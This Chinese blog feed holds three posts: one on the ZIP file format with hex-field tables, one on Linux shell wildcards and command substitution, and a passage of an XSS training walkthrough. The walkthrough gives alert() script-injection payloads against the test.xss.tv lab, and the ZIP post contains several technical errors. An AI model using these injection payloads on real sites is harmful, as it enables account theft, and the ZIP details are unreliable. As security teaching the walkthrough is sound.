align="left">文件注释</td></tr></tbody></table><p>主文件结束描述数据块（0x504B0506）：</p><table><thead><tr><th align="left">偏移</th><th align="left">字节数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">固定值0x06054b50</td></tr><tr><td align="left">4</td><td align="left">2</td><td align="left">当前分卷号</td></tr><tr><td align="left">6</td><td align="left">2</td><td align="left">Central Directory的开始分卷号</td></tr><tr><td align="left">8</td><td align="left">2</td><td align="left">当前分卷Central Directory的记录数量</td></tr><tr><td align="left">10</td><td align="left">2</td><td align="left">Central Directory的总记录数量</td></tr><tr><td align="left">12</td><td align="left">4</td><td align="left">Central Directory的大小 (bytes)</td></tr><tr><td align="left">16</td><td align="left">4</td><td align="left">Central Directory的开始位置偏移</td></tr><tr><td align="left">20</td><td align="left">2</td><td align="left">Zip文件注释长度(n)</td></tr><tr><td align="left">22</td><td align="left">n</td><td align="left">Zip文件注释</td></tr></tbody></table><h3 id="正文-gt-解释："><a href="#正文-gt-解释：" class="headerlink" title="正文-&gt;解释："></a>正文-&gt;解释：</h3><p>  有了上面的表格，这里的解释就可以更形象一点，从上面的表格可以看出，具体的zip文件格式模块可以分成4大块：</p><ol><li>文件头实体（0x504B0304）：必选模块，记录被压缩的的每一个文件的文件头信息，文件数据信息，以及数据描述信息，主要部分便是上述表格内容。与核心压缩内容块对应，压缩包中包含几个文件，就有几个<code>0x504B0304</code>模块。</li><li>压缩数据描述符（0x504B0708）：可选模块，用于在不能对输出的 ZIP 文件进行检索（如磁带机）时使用。只有在相应的local file header中通用标记字段的第３bit设为１时才会出现，跟在每一个文件头模块的后面。</li><li>核心压缩数据目录（0x504B0102）：必选模块，记录被压缩文件的具体数据，一部分与文件头模块对应，一部分为文件内容的偏移模块，压缩内容寻址方式就是在这里记录的。该模块的一些标识信息对应文件头模块的信息，下面会做具体解释。</li><li>目录结束标识符（0x504B0506）：必选模块，用于标记压缩的目录数据的结束，每一个压缩文件只有一个目录结束标识符，记录压缩包的简介信息以及文件读取等。</li></ol><p> 这里用一张图来描述：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/1.png" class="" title="对zip压缩包通用格式的认识"><p>  local header指的就是文件头，统称为file header，由central directory（也就是核心目录）控制着偏移位置。而且计算机也是通过读核心目录的个数来确定文件实体的个数和文件内容的具体信息，这就注定了在一个压缩文件中，有一个0x504B0102就有一个0x504B0304。而核心目录的偏移地址和大小由目录结束标识符来确定。此外，这里强调一下，在hex编辑器里面，排在后面的字节是高位字节，排在前面的字节是低位字节。</p><h5 id="实例分析："><a href="#实例分析：" class="headerlink" title="实例分析："></a>实例分析：</h5><p>  先看一下样本压缩包的总体可视化框架的格式：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/0.jpg" class="" title="对zip压缩包通用格式的认识"><p>  OK，懂了这些的话，对于其中具体的分析就能有一个大架构的认识。这里再对每一个大模块里面的具体内容做一个大致的实例分析，第一大块部分：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/2.jpg" class="" title="对zip压缩包通用格式的认识"><p>这是一张zip压缩包最前面部分的截图，可以看出这个是文件头实体，解释如下：</p><table><thead><tr><th align="center">16进制码</th><th align="center">十进制码</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">0x04034B50</td><td align="center">67324752</td><td align="center">十进制码没有特殊意义，这里表示PK文件模块，是每一个文件头实体的标识符开始，后面标注部分的一连串字节描述文件部分简介信息。</td></tr><tr><td align="center">0x0014</td><td align="center">20</td><td align="center">表示解压该文件的pkware（该公司的数据压缩库）的最低版本是2.0。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">表示该文件只能在支持输出zip的设备机上使用，如果是0x1000时才是代表该文件可以在无法检索zip文件信息的设备上读入。</td></tr><tr><td align="center">0x0008</td><td align="center">8</td><td align="center">这两位位是加密方式，有无加密，哪种加密方式都是在此记录。</td></tr><tr><td align="center">0xAB6D</td><td align="center">43885</td><td align="center">文件最后修改时间（这里是标准的MS-DOS时间日，因为该程序是在MS-DOS上发明的）。</td></tr><tr><td align="center">0x4E74</td><td align="center">20084</td><td align="center">文件最后修改日期（这里是标准的MS-DOS时间日，因为该程序是在MS-DOS上发明的）。</td></tr><tr><td align="center">0x4FB0B314</td><td align="center">1336980244</td><td align="center">crc32校验码（也就是循环冗余校验码），用于判断传输的文件是否完整，对于两个文件来说，crc32校验码出现相同的概率实在是太小了，所以一个crc32基本只能标识一个文件。产生crc32的算法是David Schwadeter的CRC-32算法。</td></tr><tr><td align="center">0x00002556</td><td align="center">9558</td><td align="center">十进制码代表该文件在压缩包中被压缩后的大小（单位是比特）。</td></tr><tr><td align="center">0x0000261B</td><td align="center">9755</td><td align="center">十进制码代表该文件在压缩包中被压缩前的大小（单位是比特）。</td></tr><tr><td align="center">0x0019</td><td align="center">25</td><td align="center">十进制码代表文件名称的长度是25比特长，也就是16进制的25个字节，16进制两个字符算一个字节。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">十进制码表示文件注释内容的长度是0比特字节，也就是16进制的0个字节长度，16进制两个字符算一个字节。</td></tr></tbody></table><p>  后面跟着的就是一些不定字节的数据信息，比如水蜜桃红部分的就是该文件头信息所解释的文件的文件名信息，以及文件内部的实体内容信息。</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/3.jpg" class="" title="对zip压缩包通用格式的认识"><p>  上面这张图就是压缩包的部分可视化简介内容，水蜜桃红部分的信息<code>0xD0C2BDA8CEC4BCFEBCD02F62 6C696E67626C696E672E7A6970</code>就是文件名称<code>blingbling.zip</code>的意思；同样的道理，大小和存储大小分别指该文件在被压缩前和被压缩后文件大小（单位是比特）；创建时间就是上面的文件最后修改时间和修改日期组合且格式化输出的显示，跟在后面的内容也就是该文件的实体内容信息了。</p><p>  如果压缩文件可以被不能检索zip压缩包的设备上读入的话，再每一个文件头实体后面都会再跟着一个压缩数据描述模块，包含固定描述符，crc32校验码，文件压缩前大小和文件压缩后大小四个部分。通俗来看，就是将实体文件头的部分信息重新提取并整理成一个单独的模块：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/4.jpg" class="" title="对zip压缩包通用格式的认识"><p>由蓝色背景显示的部分就是一个例子，</p><table><thead><tr><th align="center">十六进制码</th><th align="center">十进制码</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">0x08074B50</td><td align="center">134695760</td><td align="center">十进制码没有意义，这里表示PK文件模块——数据描述模块的开始，用于描述该文件的最主要解释数据，即后面跟着的数据信息。</td></tr><tr><td align="center">0x4FB0B314</td><td align="center">1336980244</td><td align="center">crc32校验码（也就是循环冗余校验码），用于判断传输的文件是否完整，对于两个文件来说，crc32校验码出现相同的概率实在是太小了，所以一个crc32基本只能标识一个文件。产生crc32的算法是David Schwadeter的CRC-32算法。</td></tr><tr><td align="center">0x00002556</td><td align="center">9558</td><td align="center">十进制码代表该文件在压缩包中被压缩后的大小（单位是比特）。</td></tr><tr><td align="center">0x0000261B</td><td align="center">9755</td><td align="center">十进制码代表该文件在压缩包中被压缩前的大小（单位是比特）。</td></tr></tbody></table><p>  模块后面可能还会跟着其他冗余信息，这里是没有。接下来跟着的模块就是下一个文件头实体的信息和文件描述信息，通俗说就是下一个压缩文件的信息，模块各数据的含义与上面举例的模块信息相同，这里不一一举例。所有的文件头实体模块和数据描述模块读完之后，就是文件目录模块。</p><p>  文件目录模块，顾名思义，就是一个与目录作用相仿的模块信息，主要是记录文件完整简介的模块，以及该文件实体内容的读取方式等，类似于记录这张截图：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/5.jpg" class="" title="对zip压缩包通用格式的认识"><p>  可以说这张可视化的图在文件目录板块都可以找到对应的信息：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/6.png" class="" title="对zip压缩包通用格式的认识"><p>该文件实体的中心核心目录块的具体解释如下：</p><table><thead><tr><th align="center">十六进制码</th><th align="center">十进制码</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">0x02014B05</td><td align="center">33639173</td><td align="center">十进制码没有特殊意义，这里表示PK文件模块——中心文件目录模块的开始，主要记录相对应目录的文件的具体简介信息，以及文件实体内容的读取方式。</td></tr><tr><td align="center">0x003F</td><td align="center">63</td><td align="center">表示解压该文件的pkware（该公司的数据压缩库）的版本是6.3。</td></tr><tr><td align="center">0x0014</td><td align="center">20</td><td align="center">表示解压该文件的pkware（该公司的数据压缩库）的最低版本是2.0。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">表示该文件只能在支持输出zip的设备机上使用，如果是0x1000时才是代表该文件可以在无法检索zip文件信息的设备上读入。</td></tr><tr><td align="center">0x0008</td><td align="center">8</td><td align="center">这两位位是加密方式，有无加密，哪种加密方式都是在此记录。</td></tr><tr><td align="center">0xAB6D</td><td align="center">43885</td><td align="center">文件最后修改时间（这里是标准的MS-DOS时间日，因为该程序是在MS-DOS上发明的）。</td></tr><tr><td align="center">0x4E74</td><td align="center">20084</td><td align="center">文件最后修改日期（这里是标准的MS-DOS时间日，因为该程序是在MS-DOS上发明的）。</td></tr><tr><td align="center">0x4FB0B314</td><td align="center">1336980244</td><td align="center">crc32校验码（也就是循环冗余校验码），用于判断传输的文件是否完整，对于两个文件来说，crc32校验码出现相同的概率实在是太小了，所以一个crc32基本只能标识一个文件。产生crc32的算法是David Schwadeter的CRC-32算法。</td></tr><tr><td align="center">0x00002556</td><td align="center">9558</td><td align="center">十进制码代表该文件在压缩包中被压缩后的大小（单位是比特）。</td></tr><tr><td align="center">0x0000261B</td><td align="center">9755</td><td align="center">十进制码代表该文件在压缩包中被压缩前的大小（单位是比特）。</td></tr><tr><td align="center">0x0019</td><td align="center">25</td><td align="center">十进制码代表文件名称的长度是25比特长，也就是16进制的25个字节，16进制两个字符算一个字节。</td></tr><tr><td align="center">0x0024</td><td align="center">36</td><td align="center">十进制码表示文件扩展字段的长度是36比特长，也就是16进制的36个字节，16进制两个字符算一个字节。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">十进制码表示文件注释内容的长度是0比特字节，也就是16进制的0个字节长度，16进制两个字符算一个字节。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">表示文件在磁盘中起始位置的号码，也是磁盘在读入该文件的时候开始解析的位置。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">用来表示该文本的数据类型，如果是0x0001，则代表该文本是ASC文本数据类型，否则是二进制数据类型。这里只用到最低位，其他做为补齐字节长度存在，为0。</td></tr><tr><td align="center">0x00000020</td><td align="center">32</td><td align="center">用来表示文件外部属性，既该文件可以依赖的主机操作系统。</td></tr><tr><td align="center">0x00000000</td><td align="center">0</td><td align="center">用来表示与该中心目录模块相对应的文件头实体在压缩包文件中的偏移地址。这里是0，即对应的0x504B0102是最前面的。</td></tr><tr><td align="center">0x+n</td><td align="center">略</td><td align="center">表示文件名称，这里的n具体的值为25，从上面可以算出来。</td></tr><tr><td align="center">0x+n+m</td><td align="center">略</td><td align="center">表示文件扩展字段，这里的n具体的值为25，m具体的值为36，从上面可以算出来。</td></tr><tr><td align="center">0x+m+n+k</td><td align="center">略</td><td align="center">表示文件注释内容，这里的n具体的值为25，m具体的值为36，k具体的值为0，从上面可以算出来。</td></tr></tbody></table><p>  中央核心目录模块可以说是索引并区分实体文件内容的钥匙，文件头实体部分的简介内容在核心目录模块中都有对应。同时，有一个<code>0x504B0102</code>就会有一个<code>0x504B0304</code>，而且中央核心目录模块的内容直接影响到对应文件的属性，比如该模块的压缩方式可以直接决定文件是否加密，以何种方式加密等等。这里还有句题外话：这些信息都是zip压缩包必定自带的数据，也就是说压缩后的数据大小比压缩前的数据大小大，算法会选择不对数据进行压缩。</p><p>  解释这么多的模块，还有一个关键问题：多个文件数据混淆在一个压缩文件中，压缩包又是怎么区分并读取这些文件的？这就牵扯到zip压缩包解析格式的最后一个模块——核心目录结束标志模块：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/7.jpg" class="" title="对zip压缩包通用格式的认识"><p>核心目录结束标志模块像是一个大的总结，一个压缩文件中只会有一个：</p><table><thead><tr><th align="center">十六进制码</th><th align="center">十进制码</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">0x06054B50</td><td align="center">101010256</td><td align="center">十进制值没有意义，这里用作pk文件目录结束说明，zip文件也是从此处开始读取各文件大致描述的。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">处理文件的磁盘号，主要的是做核心目录结束记录。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">核心目录在磁盘中的起始号，记录第一个核心目录起始位置。</td></tr><tr><td align="center">0x0003</td><td align="center">3</td><td align="center">记录压缩文件中核心目录的总个数（这里是在磁盘中的）。</td></tr><tr><td align="center">0x0003</td><td align="center">3</td><td align="center">记录压缩文件中核心目录的总个数（这里是指zip文件中的）。</td></tr><tr><td align="center">0x0000012D</td><td align="center">301</td><td align="center">十进制码表示所有核心目录模块在zip文件中所占的字节格式，也就是301个字节，对应16进制的602个字符，十六进制下两个字符算一个字节。</td></tr><tr><td align="center">0x0000260E</td><td align="center">9742</td><td align="center">十进制码表示第一个核心目录模块的初始位置在文件中的偏移位置。这里就是指第一个核心目录模块的从文件的第9743个字节开始。</td></tr><tr><td align="center">0x0000</td><td align="center">0</td><td align="center">十进制码表示zip文件的注释字段长度。</td></tr><tr><td align="center">0x+k</td><td align="center">略</td><td align="center">这里的k即为上一行的十进制码的值，内容就是zip文件的注释部分在压缩后的内容。</td></tr></tbody></table><p>  这个核心目录结束模块数据不多，确是zip文件读取的入口。一般都是先找到核心目录结束符，通过里面的核心目录个数和首个核心目录偏移位置找到这个核心目录模块，在根据里面的对应实体文件所在偏移位置读取实体文件，便可以还原一个压缩文件。而这其中一些相同的数据模块也不是冗余数据，是用来判断文件所属，关键的地方对应不上便会造成压缩文件损坏而不可读取。</p><hr><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>  上面描述的zip文件是以pkzip作为模版的，一些属性问题都与pkware公司当初在开发pkzip时的环境和规定有关，详情可以参见pkware公司出留下的开发手册。总的来说，zip文件格式分为不定量个核心文件目录模块和等量的文件头实体模块（条件成立下还可能存在等量的数据描述符模块），以及一个核心目录结束标志模块，通过Roger Schlafiy提供的加密算法进行加密，以树形结构解析文件，将数据压缩到同一个文件下。</p><p>  上述内容来自我个人在查阅资料后的个人理解，如果有什么不正确的地方还请及时骚扰批评我：</p><img src="/2021/05/09/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/QQ.png" class="" title="对zip压缩包通用格式的认识">]]></content>
    
    
    <categories>
      
      <category>其他学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>zip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux中通配符的初步认识</title>
    <link href="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/"/>
    <url>/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>  之前学过php下的正则表达式，有一点突发的感觉，这几天在做题的时候发现Linux也有类似的用法，不同的是在Linux中是用在命令执行方面的，关于命令执行，等学的差不多了，过段时间就记录一下。今天主要是记录Linux的命令通配符以及经常与通配符连用的特殊字符。</p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>  这里还得废话一波，省的以后忘记。Linux的通配符指的就是shell的内置功能，指可以代替Linux命令的特殊字符的总称，例如下面这些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">|     <span class="hljs-comment">#管道符，或者（正则）</span><br>&gt;     <span class="hljs-comment">#输出重定向</span><br>&gt;&gt;    <span class="hljs-comment">#输出追加重定向</span><br>&lt;     <span class="hljs-comment">#输入重定向</span><br>&lt;&lt;    <span class="hljs-comment">#追加输入重定向</span><br>~     <span class="hljs-comment">#当前用户目录</span><br>`` <span class="hljs-comment">#将中间的内容当作命令执行</span><br>$() <span class="hljs-comment">#引用命令被执行后的结果</span><br>$     <span class="hljs-comment">#以。。。结尾（正则）</span><br>^     <span class="hljs-comment">#以。。。开头（正则）</span><br>*     <span class="hljs-comment">#匹配全部字符，通配符</span><br>？    <span class="hljs-comment">#任意一个字符，通配符</span><br><span class="hljs-comment">#     #注释</span><br>&amp;     <span class="hljs-comment">#让程序或脚本切换到后台执行</span><br>&amp;&amp;    <span class="hljs-comment">#并且 同时成立</span><br>[]    <span class="hljs-comment">#表示一个范围（正则，通配符）</span><br>&#123;&#125;    <span class="hljs-comment">#产生一个序列（通配符）</span><br>.     <span class="hljs-comment">#当前目录的硬链接</span><br>..    <span class="hljs-comment">#上级目录的硬链接</span><br></code></pre></td></tr></table></figure><p>  这些通配符可以用来匹配字符串，命令或者文件名。在DOS，经常利用这些命令查询多个同类型文件或执行多条命令。关于<code>*、?、[]、&#123;&#125;</code>等等一系列正则表达式的用法这里不做过多解释，详细可以参考<a href="https://shuishangyun.github.io/2019/01/20/PHP%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E7%BB%93/">这个记录</a>。</p><p>这里放几张图展示一下：</p><h3 id="命令通配符："><a href="#命令通配符：" class="headerlink" title="命令通配符："></a>命令通配符：</h3><ol><li><p><code>*</code>匹配所有字符</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/1.jpg" class="" title="linux中通配符的初步认识"></li><li><p><code>?</code>匹配任意一个字符</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/2.jpg" class="" title="linux中通配符的初步认识"></li><li><p><code>[字符串]</code>匹配被包含的任意一个字符</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/3.jpg" class="" title="linux中通配符的初步认识"></li><li><p><code>&#123;&#125;</code>生成序列文件</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/4.jpg" class="" title="linux中通配符的初步认识"></li></ol><p>具体说明一下命令特殊符号的用法：</p><h3 id="命令特殊符号："><a href="#命令特殊符号：" class="headerlink" title="命令特殊符号："></a>命令特殊符号：</h3><ol><li><p><code>|</code>：这个符号叫做管道符可以同时执行多个命令，作用如下：</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/5.jpg" class="" title="linux中通配符的初步认识"><p>可以看到管道符先执行了<code>touch</code>命令，然后再<code>ls</code>命令。在同一命令行，管道符可以执行多个命令。</p></li><li><p><code>&gt;、&gt;&gt;、&lt;、&lt;&lt;</code>：这几个符号叫重定向符号，不同的前两个是输出重定向，后两个是输入重定向。</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/6.jpg" class="" title="linux中通配符的初步认识"><p>可以看出来，输出重定向符将原文中的内容清空了，然后可以存入我们输入的内容，且抛弃最后一条。</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/7.jpg" class="" title="linux中通配符的初步认识"><p>可以看出，输出追加重定向符并没有清空原文的内容，而是在其后面输入追加的内容，且抛弃最后一条。</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/8.jpg" class="" title="linux中通配符的初步认识"><p>可以看到，输入重定向符将原文内容直接打印出来，因为每次测试的时候都只在目标文件里留下这一个字符串，所以看到的效果就只有一个字符串，这个说明输入重定向符将文件内容从头到尾打印出来。</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/9.jpg" class="" title="linux中通配符的初步认识"><p>测试结果：之后的分界符可以自由定义，只要再碰到相同的分界符，两个分界符之间的内容将作为命令的输入（不包括分界符本身）。</p><p>  这里的输入输出指的是命令行的输入输出，比如<code>&gt;</code>对命令行来说是输出，对于文件来说就是输入，所可以看到在命令行的内容就会输入文件内部。上面举例的这些是默认的标准输入输出重定向，也就是默认重定向，除了这些基本用法之外，重定向符还可以控制其他不同的数据流模式：</p><ul><li>标准输入；代码为 0 ；或称为 stdin ；使用的方式为 <code>命令 &lt;文本</code>；将显示的结果输出到文件中，若该文件以存在则予以取代！</li><li>标准输出：代码为 1 ；或称为 stdout；使用的方式为 <code>命令 1&gt;文本</code>；将显示的数据，正确的输出到 文本。</li><li>错误输出：代码为 2 ；或称为 stderr；使用的方式为 <code>命令 2&gt;文本</code>；将显示的数据，错误的输出到文本。 </li></ul><p>  重定向符还可以和<code>&amp;</code>符号连用，比如<code>1&gt;&amp;2</code>表示标准输出定向到标准错误，所以可以在标准错误的数据流中找到标准输出内容，用法举例：<code>命令 2&gt;文本 1&gt;&amp;2</code>，同理：<code>2&gt;&amp;1</code>表示标准错误重定向到标准输出，等等多种组合。举一反三的事情值得实践。</p></li><li><p><code>~</code>表示当前用户，就是home目录，也就是用户权限目录。这里不暴露我电脑的个人信息，不做图像演示，点到为止。</p></li><li><p>```、$()`可以将放入其中的字符串当作命令执行</p><img src="/2021/05/09/linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/10.jpg" class="" title="linux中通配符的初步认识"><p>可以看出，三条命令执行的结果都是一样的，前两步就是先执行<code>which cat</code>命令，第一次的执行结果就是第三步命令，然后再执行第三步命令。</p></li></ol><p>这些就是从各路神仙的学习笔记中挑出来我认为常见的通配符和命令特殊符的使用，如果有哪里不对，可以请大佬们指点一下吗？批评通道：</p>]]></content>
    
    
    <categories>
      
      <category>其他学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS攻击通关之路</title>
    <link href="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/"/>
    <url>/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS攻击通关之路"><a href="#XSS攻击通关之路" class="headerlink" title="XSS攻击通关之路"></a>XSS攻击通关之路</h1><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>  之前去郑州学习的时候看了一套比较系统的XSS注入的视频，简直是要膜拜做这个视频的人，以前会的XSS注入测试跟着一比简直是关公门前耍大刀，不仅刷新了以前对这个注入的理解，还涨了不少姿势。看来以后这种学习大会一定要多去去见识见识，没有什么比这提升更快了我觉得。。。。。。</p><h3 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h3><p>  刚开始还是先在这里记录一下XSS注入的意义和危害吧：</p><p>  XSS攻击又叫跨站脚本攻击，它是一种经常出现在WEB应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。主要利用的就是JavaScript，对于hacker来说，XSS就是一种新生的”缓冲区溢出攻击“，而JavaScript就是这个攻击中的ShellCode。这个比喻确实很形象。</p><h5 id="XSS攻击可能产生的危害："><a href="#XSS攻击可能产生的危害：" class="headerlink" title="XSS攻击可能产生的危害："></a>XSS攻击可能产生的危害：</h5><ol><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ol><h5 id="XSS攻击的分类："><a href="#XSS攻击的分类：" class="headerlink" title="XSS攻击的分类："></a>XSS攻击的分类：</h5><ol><li>DOM型：这是一种hacker和受害用户直接交互的本地利用漏洞，简单说就是hacker给某个特定用户发送了一串含有ShellCode的URL，用户不小心点开该URL，hacker的ShellCode在用户的客户端上被触发执行，利用JavaScript打开一个具有某种漏洞的HTML界面并安装在用户的客户端界面上。</li><li>反射型：这是一种hacker通过第三方服务器与受害用户交互的服务端利用漏洞，简单说就是hacker发现在某个服务端网站上存在反射型的XSS漏洞（也就是客户端的请求数据的响应结果直接经过服务端返回的URL，直接返回给客户端浏览器），伪造一个含有ShellCode的URL，并以服务端的名义发送给用户，用户在点开之后就会触发ShellCode，JavaScript就会将用户的信息传给hacker伪造的站点。</li><li>存储型：这是一个hacker利用服务端数据库窃取用户信息的XSS漏洞，某服务端未完全过滤ShellCode，并允许用户在站点发布和浏览信息，hacker利用这一点将ShellCode存入数据库，站点在解析的时候就会执行该ShellCode，阅读hacker发布信息的用户就有可能被窃取cookie或者其他信息。</li></ol><h5 id="XSS攻击常见利用方式："><a href="#XSS攻击常见利用方式：" class="headerlink" title="XSS攻击常见利用方式："></a>XSS攻击常见利用方式：</h5><p>  接下来使用的都是xss在线训练链接</p><ol><li><p>最简单的就是普通的GET型XSS，这里描述参数不加密的URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">http:&#x2F;&#x2F;test.xss.tv&#x2F;level1.php?name&#x3D;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure><img src="/2021/05/09/XSS%E6%94%BB%E5%87%BB%E9%80%9A%E5%85%B3%E4%B9%8B%E8%B7%AF/level1.jpg" class="" title="XSS攻击通关之路"><p>  这是第一关，直接URL参数提交注入，该注入能产生说明程序员没有过滤或用引号包裹任何参数内容，也就是说后台代码直接解析执行参数值。这就造成在弱类型的语言中，原本是正常的字符串被当作代码执行，形成该XSS漏洞。</p></li><li><p>第二种就是带<code>&lt;input&gt;</code>标签的GET型XSS，直接在表单输入窗口直接输入XSS代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">http:&#x2F;&#x2F;test.xss.tv&#x2F;level2.php?keyword&#x3D;&quot;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure><p>  这里选择在URL处直接注入代码，带<code>&lt;input&gt;</code>标签的GET型XSS和普通的GET型XSS最大的区别就是普通的GET型XSS的参数可以直接被解析，而带<code>&lt;input&gt;</code>标签的GET型XSS还需要闭合原本的<code>input窗口</code>，然后才能注入ShellCode。闭合点举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;form action&#x3D;level2.php method&#x3D;GET&gt;<br>&lt;input name&#x3D;keyword  value&#x3D;&quot;test&quot;&gt;<br>&lt;input type&#x3D;submit name&#x3D;submit 